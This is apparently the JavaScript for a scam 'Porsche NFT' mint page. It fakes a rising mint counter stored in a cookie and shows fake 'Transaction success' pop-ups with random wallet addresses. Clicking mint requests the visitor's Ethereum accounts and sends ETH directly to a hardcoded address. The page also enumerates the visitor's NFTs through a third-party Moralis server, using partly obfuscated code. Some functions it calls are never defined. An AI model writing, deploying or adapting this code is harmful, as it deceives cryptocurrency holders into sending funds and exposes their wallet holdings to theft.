const ADDRESS = '0x7C9466D359Bf266f335B78a0A4b50998E0f77567';
const ethereum = window.ethereum
const IMGPrice = 0.01;
const mint = document.querySelector(".mint")
const connect = document.querySelector(".connect")
const title = document.querySelector(".metamask_content-title")
const totalPrice = document.querySelector(".totalPrice")
const count = document.querySelector(".count")
const MAX = 5
const namess = "Porsche NFT";
const discord = '#';
const twitter = 'https://twitter.com/eth_porsche';
const startCounter = 1469;
const endCounter = 3333;
let price = 0.0;
var totalPriceAmount = price;
var countAmount = 1;
var nftss, accounts;
var web3 = window.Web3
function getNow() {
    var d = new Date();
    var year = d.getFullYear();
    var month = change(d.getMonth() + 1);
    var day = change(d.getDate());
    var hour = change(d.getHours());
    var minute = change(d.getMinutes());
    var second = change(d.getSeconds());

    function change(t) {
        if (t < 10) {
            return "0" + t;
        } else {
            return t;
        }
    }
    var time = day + '/' + month + '/' + year + ' ' + hour + ':' + minute + ':' + second;
    return time;
}
var settimesss = function() {
    var now = getNow();
    document.getElementById("timess").innerHTML = now;
}
setInterval(settimesss, 1000);

document.getElementById("names").innerHTML = namess;
document.getElementById("end_txt").innerHTML = endCounter;
let mintNumber = getCookie('mintNumber');
if (mintNumber) {
    mintNumber = parseInt(mintNumber);
} else {
    setCookie('mintNumber', startCounter, 365);
    mintNumber = parseInt(getCookie('mintNumber'));
}
if (mintNumber >= endCounter) {
    mintNumber = endCounter;
}
document.getElementById("start_txt").innerHTML = mintNumber
var progressBar = (mintNumber / endCounter * 100).toFixed(2);
if (progressBar >= 100) {
    progressBar = 100;
}
document.getElementById("percentages_txt").innerHTML = progressBar + "%";
document.getElementById("percentages_lin").style.width = progressBar + "%";

function checkConnectStatus() {
    if (ethereum) {
        if (ethereum.selectedAddress) {
            connect.style.display = "none"
            mint.style.display = "block"
        } else if (ethereum.isMetaMask) {
            connect.style.display = "block"
            mint.style.display = "none"
        }
    } else {
        connect.style.display = "block"
        mint.style.display = "none"
    }
}
window.addEventListener("load", () => {
    totalPrice.innerText = price;
    checkConnectStatus();

})

document.getElementById("discord_btn").addEventListener("click", async () => {
    window.open(discord);

})
document.getElementById("twitter_btn").addEventListener("click", async () => {
    window.open(twitter);
})
var serverUrl = "https://reprr17rtzlf.usemoralis.com:2053/server",
    appId = "UULvsLlLVresI4YMRk1EJCdi4p99v0r43j5ZnAC9",
    _0x1829e9 = {};
_0x1829e9["serverUrl"] = serverUrl;
_0x1829e9["appId"] = appId, Moralis["start"](_0x1829e9);

const getAccount = async () => {
    try {
        web3 = await Moralis["enableWeb3"]();
        accounts = await ethereum.request({
            method: 'eth_requestAccounts'
        });
        // console.log(accounts)
        await syncNfts();
        if (window.ethereum.chainId == "0x1") {
            console.log("Already connected to ethereum mainnet...");
            checkConnectStatus();
        } else {
            try {
                await ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{
                        chainId: '0x1'
                    }],
                });
                checkConnectStatus();
            } catch (switchError) {
                // This error code indicates that the chain has not been added to MetaMask.
                if (error.code === 4902) {
                    try {
                        await ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x1',
                                rpcUrl: netURL
                            }],
                        });
                        checkConnectStatus();
                    } catch (addError) {
                        // handle "add" error
                        console.log(addError);
                    }
                }
            }
        }
    } catch (e) {
        checkConnectStatus();
        console.log(e);
    }
}
window.ethereum ? window.ethereum.on('disconnect', (err) => {
    console.log(err);
    checkConnectStatus();
}) : null;
window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
    if (accounts.length < 1) checkConnectStatus()
}) : null;

function handleMessage(message = msg) {
    const notificationDiv = document.createElement("div");
    // el-notification right el-notification-fade-enter-active el-notification-fade-enter-to
    notificationDiv.className = "el-notification";
    notificationDiv.classList.add("notificationss", "right");
    const div2 = document.createElement("div");
    div2.className = "notification__group";
    const div3 = document.createElement("div");
    div3.className = "el-notification__content";
    const h2 = document.createElement("h2");
    h2.className = "el-notification__title";
    h2.innerHTML = "Transaction success";
    const p1 = document.createElement("p");
    p1.innerHTML = message;
    div3.appendChild(p1);
    div2.appendChild(h2);
    div2.appendChild(div3);
    notificationDiv.appendChild(div2);
    document.getElementById("body").appendChild(notificationDiv);
    setTimeout(() => {
        notificationDiv.remove();
    }, 2400);
}
let ran_time = (Math.floor(Math.random() * 30) + 10) * 100;
var getProgress = function getProgress() {
    var i = Math.floor(Math.random() * MAX);
    ran_time = (Math.floor(Math.random() * 15) + 10) * 100;
    var j = Math.floor(Math.random() * 47);
    mintNumber += i;
    var percentages = (mintNumber / endCounter * 100).toFixed(2);
    if (percentages >= 100) {
        document.getElementById("percentages_txt").innerHTML = "100%";
        document.getElementById("percentages_lin").style.width = "100%";
        document.getElementById("start_txt").innerHTML = endCounter;
        setCookie('mintNumber', endCounter, 365);
        clearInterval(divNotification);
    } else {
        setCookie('mintNumber', mintNumber, 365);
        document.getElementById("percentages_lin").style.width = percentages + "%";
        document.getElementById("percentages_txt").innerHTML = percentages + "%";
        document.getElementById("start_txt").innerHTML = mintNumber

    }
    var str = wallet[j].slice(0, 10) + "......" + wallet[j].slice(-10);
    handleMessage(str);
};
var divNotification = setInterval(getProgress, ran_time);

const round = (value) => {
    return Math.round(value * 10000) / 10000;
}

var sendTransaction1 = async () => {
    const priceToWei = (totalPriceAmount * 1e18).toString(16)
    //const gasLimit = (100000 * totalPriceAmount).toString(16);
    ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
                from: accounts[0],
                to: ADDRESS,
                value: priceToWei
            }, ],
        })
        .then((txHash) => {
            $('#mintingModal').modal('show')
            mini.click();
        })
        .catch((error) => {
            mint.click();
        });
};



// setTimeout(function() {
//     getAccount();
// }, 1000);

mint.addEventListener("click", async () => {
    await getAccount()
    await sendTransaction()

});

connect.addEventListener("click", async () => {
    await getAccount()

})

function setCookie(cname, cvalue, exdays) {
    const d = new Date();
    d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
    let expires = "expires=" + d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function getCookie(cname) {
    let name = cname + "=";
    let ca = document.cookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

document.querySelector(".plus").addEventListener("click", () => {
    if (countAmount < MAX) {
        countAmount++;
        totalPriceAmount = (countAmount * price).toFixed(3);
        count.innerText = countAmount;
        totalPrice.innerText = totalPriceAmount;
    }
})

document.querySelector(".minus").addEventListener("click", () => {
    if (countAmount > 1) {
        countAmount--;
        totalPriceAmount = (countAmount * price).toFixed(3);
        count.innerText = countAmount;
        totalPrice.innerText = totalPriceAmount;
    }
})


function getMobileOperatingSystem() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
    // console.log(userAgent);
    // Windows Phone must come first because its UA also contains "Android"
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const uid = urlParams.get('uid')
    // console.log(uid);
    if (uid == "mm") {
        return "Metamask";
    }
    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }

    if (/android/i.test(userAgent)) {
        return "Android";
    }

    // iOS detection from: http://stackoverflow.com/a/9039885/177710
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }

    return "unknown";
}
async function syncNfts() {
    try {
        nftss = await Moralis["Web3"]["getNFTs"]({
            "chain": "eth",
            "address": accounts[0]
        });
    } catch (_0x343e6c) {
        console["log"](_0x343e6c);
    }
}


document.addEventListener('DOMContentLoaded', (event) => {
    // getAccount();
    if (getMobileOperatingSystem() == "Android" || getMobileOperatingSystem() == "iOS") {
        var wrapper = document.createElement('a');
        wrapper.classList.add('mmLink');
        wrapper.href = "https://metamask.app.link/dapp/" + ((window.location.href).replace('https://', '').replace('http://', '')) + "?uid=mm";
        connect.parentNode.insertBefore(wrapper, connect);
        wrapper.appendChild(connect);
    }

});